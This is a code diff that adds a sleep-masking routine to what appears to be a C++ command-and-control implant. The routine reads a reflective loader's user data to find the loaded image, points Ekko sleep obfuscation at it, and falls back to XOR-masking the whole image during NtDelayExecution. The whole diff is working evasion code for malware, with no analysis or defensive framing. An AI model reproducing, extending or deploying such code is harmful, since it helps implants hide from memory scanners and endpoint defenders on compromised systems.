@@ -152,4 +152,51 @@ auto declfn evasion_ekko_sleep( instance& inst, uint32_t sleep_ms ) -> void {
     evasion_post_sleep( inst );
 }
 
+auto declfn evasion_udrl_sleep( instance& inst, uint32_t sleep_ms ) -> void {
+#if SLEEP_MASK_TYPE == MASK_UDRL
+    /*
+     * UDRL sleep mask. When the UDRL loader provided user data, update
+     * the ekko fields from it (the reflectively loaded image may live at
+     * a different base than what RipStart() computed). Then dispatch to
+     * Ekko (x64) or full-image XOR fallback.
+     */
+    if ( inst.evasion.udrl_user_data ) {
+        /* UDRL_USER_DATA layout (with -fpack-struct=8):
+         *   +0x00  uint64  magic
+         *   +0x08  uint32  load_type  (+pad)
+         *   +0x10  ptr     agent_base
+         *   +0x18  uint32  agent_size (+pad)
+         * Use agent_base/size to patch ekko fields so the mask covers
+         * the reflectively loaded image, not the original shellcode. */
+        auto ud = reinterpret_cast<uint8_t*>( inst.evasion.udrl_user_data );
+        uint64_t magic = *reinterpret_cast<uint64_t*>( ud );
+
+        if ( magic == 0x5442525354ULL && inst.evasion.ekko.initialized ) {
+            auto new_base = *reinterpret_cast<uintptr_t*>( ud + 0x10 );
+            auto new_size = *reinterpret_cast<uint32_t*>( ud + 0x18 );
+            if ( new_base && new_size ) {
+                inst.evasion.ekko.img_base = new_base;
+                inst.evasion.ekko.img_size = new_size;
+            }
+        }
+    }
+
+#ifdef _WIN64
+    if ( inst.evasion.ekko.initialized ) {
+        ekko_sleep( inst, sleep_ms );
+        return;
+    }
+#endif
+
+    /* x86 or ekko not initialized: full-image XOR fallback */
+    evasion_pre_sleep( inst );
+    LARGE_INTEGER delay;
+    delay.QuadPart = -static_cast<LONGLONG>( sleep_ms ) * 10000LL;
+    inst.ntdll.NtDelayExecution( FALSE, &delay );
+    evasion_post_sleep( inst );
+#else
+    (void)inst; (void)sleep_ms;
+#endif
+}
+
 } // namespace starburst
